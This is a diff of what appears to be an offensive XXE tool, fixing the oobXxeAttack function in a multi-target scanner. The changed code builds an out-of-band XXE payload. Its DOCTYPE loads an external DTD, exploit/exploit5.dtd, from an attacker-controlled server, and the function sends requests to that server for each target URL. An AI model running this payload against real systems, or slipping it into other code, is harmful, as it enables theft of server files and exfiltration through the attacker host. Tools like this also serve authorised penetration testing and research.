@@ -68,7 +68,7 @@ def XXEPOINT(target_urls : list , mongo , attacker_server):
 
     sendMsg(client_socket, "reset".encode())
 
-    oobXxeAttack(target_urls, mongo , attacker_server)
+    oobXxeAttack(target_urls,  attacker_server)
 
 
 
@@ -110,7 +110,7 @@ def oobXxeAttack(target_urls : list , attacker_server : str):
                 'Accept': 'application/xml' }
 
     for target_url in target_urls:
-        url = '{}url/{}'.format(attacker_server,target_url)
+        url = '{}/url/{}'.format(attacker_server,target_url)
         requests.get(url)  
         # Crafting XXE Payload
         payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit5.dtd"> %xxe; ]>'.format(attacker_server)
